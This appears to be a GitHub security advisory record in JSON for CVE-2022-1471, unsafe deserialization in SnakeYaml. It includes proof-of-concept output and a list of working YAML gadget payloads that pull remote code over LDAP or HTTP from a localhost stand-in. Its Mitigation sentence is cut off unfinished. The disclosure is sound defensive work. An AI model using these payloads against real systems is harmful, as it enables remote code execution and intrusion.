{
  "schema_version": "1.3.0",
  "id": "GHSA-mjmj-j48q-9wg2",
  "modified": "2022-12-15T18:36:08Z",
  "published": "2022-12-12T21:19:47Z",
  "aliases": [
    "CVE-2022-1471"
  ],
  "summary": "SnakeYaml Constructor Deserialization Remote Code Execution",
  "details": "### Summary\n\nSnakeYaml's `Constructor` class, which inherits from `SafeConstructor`, allows any type be deserialized given the following line:\n\n```java\nnew Yaml(new Constructor(TestDataClass.class)).load(yamlContent);\n```\n\nTypes do not have to match the types of properties in the target class. A `ConstructorException` is thrown, but only after a malicious\npayload is deserialized.\n\n### Severity\nHigh, lack of type checks during deserialization allows remote code execution.\n\n### Proof of Concept\nExecute `bash run.sh`. The PoC uses Constructor to deserialize a payload\nfor RCE. RCE is demonstrated by using a payload which performs a http request to\nhttp://127.0.0.1:8000.\n\nExample output of successful run of proof of concept:\n\n```\n$ bash run.sh\n\n[+] Downloading snakeyaml if needed\n[+] Starting mock HTTP server on 127.0.0.1:8000 to demonstrate RCE\nnc: no process found\n[+] Compiling and running Proof of Concept, which a payload that sends a HTTP request to mock web server.\n[+] An exception is expected.\nException:\nCannot create property=payload for JavaBean=Main$TestDataClass@3cbbc1e0\n in 'string', line 1, column 1:\n    payload: !!javax.script.ScriptEn ... \n    ^\nCan not set java.lang.String field Main$TestDataClass.payload to javax.script.ScriptEngineManager\n in 'string', line 1, column 10:\n    payload: !!javax.script.ScriptEngineManag ... \n             ^\n\n\tat org.yaml.snakeyaml.constructor.Constructor$ConstructMapping.constructJavaBean2ndStep(Constructor.java:291)\n\tat org.yaml.snakeyaml.constructor.Constructor$ConstructMapping.construct(Constructor.java:172)\n\tat org.yaml.snakeyaml.constructor.Constructor$ConstructYamlObject.construct(Constructor.java:332)\n\tat org.yaml.snakeyaml.constructor.BaseConstructor.constructObjectNoCheck(BaseConstructor.java:230)\n\tat org.yaml.snakeyaml.constructor.BaseConstructor.constructObject(BaseConstructor.java:220)\n\tat org.yaml.snakeyaml.constructor.BaseConstructor.constructDocument(BaseConstructor.java:174)\n\tat org.yaml.snakeyaml.constructor.BaseConstructor.getSingleData(BaseConstructor.java:158)\n\tat org.yaml.snakeyaml.Yaml.loadFromReader(Yaml.java:491)\n\tat org.yaml.snakeyaml.Yaml.load(Yaml.java:416)\n\tat Main.main(Main.java:37)\nCaused by: java.lang.IllegalArgumentException: Can not set java.lang.String field Main$TestDataClass.payload to javax.script.ScriptEngineManager\n\tat java.base/jdk.internal.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:167)\n\tat java.base/jdk.internal.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:171)\n\tat java.base/jdk.internal.reflect.UnsafeObjectFieldAccessorImpl.set(UnsafeObjectFieldAccessorImpl.java:81)\n\tat java.base/java.lang.reflect.Field.set(Field.java:780)\n\tat org.yaml.snakeyaml.introspector.FieldProperty.set(FieldProperty.java:44)\n\tat org.yaml.snakeyaml.constructor.Constructor$ConstructMapping.constructJavaBean2ndStep(Constructor.java:286)\n\t... 9 more\n[+] Dumping Received HTTP Request. Will not be empty if PoC worked\nGET /proof-of-concept HTTP/1.1\nUser-Agent: Java/11.0.14\nHost: localhost:8000\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\nConnection: keep-alive\n```\n\n### Proof of Concept Payloads\n\nAny of the following payloads can allow an attacker to achieve remote code execution:\n\nFor `SpringPropertyPathFactory`:\n```yaml\n!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n  targetBeanName: \"ldap://localhost:1389/obj\"\n  propertyPath: foo\n  beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n    shareableResources: [\"ldap://localhost:1389/obj\"]\n```\n\n\nFor `SpringAbstractBeanFactoryPointcutAdvisor`:\n```yaml\nset:\n  ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\n    adviceBeanName: \"ldap://localhost:1389/obj\"\n    beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n      shareableResources: [\"ldap://localhost:1389/obj\"]\n  ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor []\n```\n\n\nFor `XBean`:\n```yaml\n!!javax.management.BadAttributeValueExpException [!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\"foo\", !!javax.naming.Reference [foo, \"Exploit\", \"http://localhost:8080/\"], !!org.apache.xbean.naming.context.WritableContext []]]\n```\n\nFor `CommonsConfiguration`:\n```yaml\nset:\n  ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \"ldap://localhost:1389/obj\"]]\n```\n\nFor `C3P0WrapperConnPool`:\n```yaml\n!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n  userOverridesAsString: \"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;\"\n```\n\n\nFor `C3P0RefDataSource` :\n```yaml\n!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n  jndiName: \"ldap://localhost:1389/obj\"\n  loginTimeout: 0\n```\n\n\nFor `JdbcRowSet`:\n```yaml\n!!com.sun.rowset.JdbcRowSetImpl\n  dataSourceName: \"ldap://localhost:1389/obj\"\n  autoCommit: true\n```\n\n\nFor `ScriptEngine`:\n```yaml\n!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://localhost:8080/\"]]]]\n```\n\n\nFor `ResourceGadget`:\n```yaml\n[!!org.eclipse.jetty.plus.jndi.Resource [\"__/obj\", !!javax.naming.Reference [\"foo\", \"Exploit\", \"http://localhost:8080/\"]], !!org.eclipse.jetty.plus.jndi.Resource [\"obj/test\", !!java.lang.Object []]]\nâ€Œ```\n\nFor `UnicastRemoteObject`:\n```yaml\n!!java.rmi.server.UnicastRemoteObject [666]\n```\n\nCredit for payloads: https://github.com/mbechler/marshalsec\n\n### Further Analysis\nPotential mitigations include, leveraging SnakeYaml's SafeConstructor while parsing untrusted content.\n\n### Mitigation\n\nTo mitigate this vulnerability, you must use \n\n### Timeline\n\nThis vulnerability was originally identified by Moritz Bechler in 2017 and published in \"[Java Unmarshaller Security Turning your data into code execution](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)\".\n\nGoogle Disclosure Timeline:\n**Date reported**: 4/11/2022\n**Date fixed**: \n**Date disclosed**: 10/13/2022\n\n### References\nMaintainer response (claims this is a feature, not a bug): https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in#comment-64581479",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L"
    }
  ],
  "affected": [
    {
      "package": {
        "ecosystem": "Maven",
        "name": "org.yaml:snakeyaml"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "last_affected": "1.30"
            }
          ]
        }
      ]
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/google/security-research/security/advisories/GHSA-mjmj-j48q-9wg2"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1471"
    },
    {
      "type": "PACKAGE",
      "url": "https://bitbucket.org/snakeyaml/snakeyaml"
    },
    {
      "type": "WEB",
      "url": "https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in#comment-64581479"
    },
    {
      "type": "WEB",
      "url": "https://github.com/mbechler/marshalsec"
    },
    {
      "type": "WEB",
      "url": "https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/"
    }
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-502"
    ],
    "severity": "HIGH",
    "github_reviewed": true
  }
}